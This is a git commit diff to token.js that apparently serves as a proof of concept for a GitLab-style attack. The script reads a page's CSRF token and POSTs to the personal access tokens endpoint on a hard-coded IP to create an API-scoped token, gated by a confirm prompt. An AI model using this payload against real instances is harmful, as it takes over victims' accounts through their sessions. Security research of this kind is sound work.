feb4859f688909f79c57483447ab335e81a8c932
Johan Carlsson <37298485+joaxcar@users.noreply.github.com>
2021-07-13 07:37:40 +0200

    Update token.js

--- token.js
+++ token.js
@@ -1,21 +1,8 @@
 function next(token) {
 fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
   "headers": {
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "accept-language": "en-US,en;q=0.9,sv-SE;q=0.8,sv;q=0.7",
-    "cache-control": "no-cache",
-    "content-type": "application/x-www-form-urlencoded",
-    "pragma": "no-cache",
-    "sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"",
-    "sec-ch-ua-mobile": "?0",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-user": "?1",
-    "upgrade-insecure-requests": "1"
+    "content-type": "application/x-www-form-urlencoded"
   },
-  "referrer": "https://65.52.77.188/-/profile/personal_access_tokens",
-  "referrerPolicy": "strict-origin-when-cross-origin",
   "body": "authenticity_token="+encodeURIComponent(token)+"&personal_access_token%5Bname%5D=asd&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api",
   "method": "POST",
   "mode": "cors",
@@ -49,6 +36,7 @@ var token = htmlDocument.documentElement.querySelector('meta[name="csrf-token"]'
 
 if(!donescript) {
   var donescript=true;
+  window.stop();
 if (confirm("Create an access token?")) {
   runner();
 }}
